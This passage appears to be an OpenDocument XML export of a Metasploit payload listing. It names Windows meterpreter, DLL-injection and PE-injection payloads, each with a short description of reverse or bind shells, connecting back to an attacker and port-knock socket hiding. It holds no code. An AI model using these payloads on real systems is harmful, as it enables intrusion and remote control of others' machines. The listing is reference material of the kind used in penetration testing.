      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_hop <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27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an HTTP or</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>HTTPS hop point. Note that you</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>must first upload data/hop/hop</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>.php to the PHP server you wish</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_htt <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31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 (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_htt <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_proxy_pstore <text:s text:c="18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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_htt <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps <text:s text:c="30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S (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_htt <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps_proxy <text:s text:c="24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 using</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>SSL with custom proxy support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_ipv <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>6_tcp <text:s text:c="27"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ct back to the attacker over IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_nam <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ed_pipe <text:s text:c="25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 via a n</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>amed pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_non <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x_tcp <text:s text:c="27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 (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_ord <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="37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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_allports <text:s text:c="23"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Try t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o connect back to the attacker,</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>on all possible ports (1-65535</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_dns <text:s text:c="28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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_rc4 <text:s text:c="28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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_rc4_dns <text:s text:c="24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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_tcp <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_uuid <text:s text:c="27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 with UU</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_win <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>http <text:s text:c="28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 (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/reverse_win <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>https <text:s text:c="27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S (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_bind_named_ <text:s/>Connect to victim and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pipe <text:s text:c="28"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_bind_tcp <text:s text:c="4"/>Connect to victim and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_reverse_htt <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_reverse_htt <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps <text:s text:c="30"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_reverse_ipv <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>6_tcp <text:s text:c="27"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter_reverse_tcp <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a Meterpreter shell. Requir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>es Windows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/metsvc_bind_tcp <text:s text:c="9"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/metsvc_reverse_tcp <text:s text:c="6"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_h <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>idden_ipknock_tcp <text:s text:c="15"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection. First, the port will</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>need to be knocked from the IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>defined in KHOST. This IP will</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>work as an authentication meth</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>od (you can spoof it with tools</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>like hping). After that you co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>uld get your shellcode from any</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>IP. The socket will appear as</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>"closed," thus helping to hide</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_h <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>idden_tcp <text:s text:c="23"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection from a hidden port an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d spawn a command shell to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>allowed host.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/patchupdllinject/bind_i <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="25"/>ploited process. Listen for an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6 connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_i <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp_uuid <text:s text:c="20"/>ploited process. Listen for an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6 connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_n <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>amed_pipe <text:s text:c="23"/>ploited process. Listen for a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ipe connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_n <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>onx_tcp <text:s text:c="25"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_t <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_t <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_rc4 <text:s text:c="26"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/bind_t <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="25"/>ploited process. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection with UUID Support (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/find_t <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ag <text:s text:c="30"/>ploited process. Use an establi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shed connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ipv6_tcp <text:s text:c="22"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_nonx_tcp <text:s text:c="22"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ord_tcp <text:s text:c="23"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_allports <text:s text:c="18"/>ploited process. Try to connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker, on all p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ossible ports (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_dns <text:s text:c="23"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_rc4 <text:s text:c="23"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_rc4_dns <text:s text:c="19"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupdllinject/revers <text:s/>Inject a custom DLL into the ex</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>e_tcp_uuid <text:s text:c="22"/>ploited process. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_hidden_ipknock_tcp <text:s text:c="13"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction. First, the port will nee</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d to be knocked from the IP def</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ined in KHOST. This IP will wor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k as an authentication method (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you can spoof it with tools lik</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e hping). After that you could</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>get your shellcode from any IP.</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>The socket will appear as "clo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sed," thus helping to hide the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_hidden_tcp <text:s text:c="21"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction from a hidden port and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell to the allo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp <text:s text:c="23"/>LL (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipv6_tcp_uuid <text:s text:c="18"/>LL (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection with UUID Support (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_named_pipe <text:s text:c="21"/>LL (staged). Listen for a pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_nonx_tcp <text:s text:c="23"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_rc4 <text:s text:c="24"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/bind <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>LL (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/find <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tag <text:s text:c="28"/>LL (staged). Use an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_ipv6_tcp <text:s text:c="20"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_nonx_tcp <text:s text:c="20"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_ord_tcp <text:s text:c="21"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_allports <text:s text:c="16"/>LL (staged). Try to connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker, on all possi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ble ports (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_dns <text:s text:c="21"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_rc4 <text:s text:c="21"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_rc4_dns <text:s text:c="17"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/patchupmeterpreter/reve <text:s/>Inject the meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp_uuid <text:s text:c="20"/>LL (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_hidden_ip <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>knock_tcp <text:s text:c="23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con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection. First, the port will n</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eed to be knocked from the IP d</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>efined in KHOST. This IP will w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ork as an authentication method</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(you can spoof it with tools l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ike hping). After that you coul</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d get your shellcode from any I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P. The socket will appear as "c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>losed," thus helping to hide th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_hidden_tc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>into the exploited process usin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g a reflective PE loader. The r</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/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con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection from a hidden port and</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>spawn a command shell to the al</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_ipv6_tcp <text:s text:c="2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n IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_ipv6_tcp_ <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uuid <text:s text:c="28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n IP</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>v6 connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_named_pip <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e <text:s text:c="31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pip</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_nonx_tcp <text:s text:c="2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con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_tcp <text:s text:c="7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oft-page-break/><text:s text:c="37"/>t currently supported. Also PE</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>files which use resource loadin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g might crash. Listen for a con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_tcp_rc4 <text:s text:c="3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con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/bind_tcp_uuid <text:s text:c="2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con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection with UUID Support (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/find_tag <text:s text:c="7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oft-page-break/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Use an establish</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_ipv6_t <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30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 over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_named_ <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pipe <text:s text:c="28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 via a named pipe p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_nonx_t <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30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oft-page-break/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 (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_ord_tc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp <text:s text:c="4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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp_al <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>lports <text:s text:c="26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oft-page-break/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Try to connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker, on all pos</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sible ports (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp_dn <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>s <text:s text:c="31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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp_rc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>4 <text:s text:c="31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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp_rc <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>4_dns <text:s text:c="27"/>into the exploited process usin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g a reflective PE loader. The r</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/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</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/peinject/reverse_tcp_uu <text:s/>Inject a custom native PE file</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>id <text:s text:c="30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 with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/pingback_bind_tcp <text:s text:c="7"/>Open a socket and report UUID w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hen a connection is received (W</text:p>
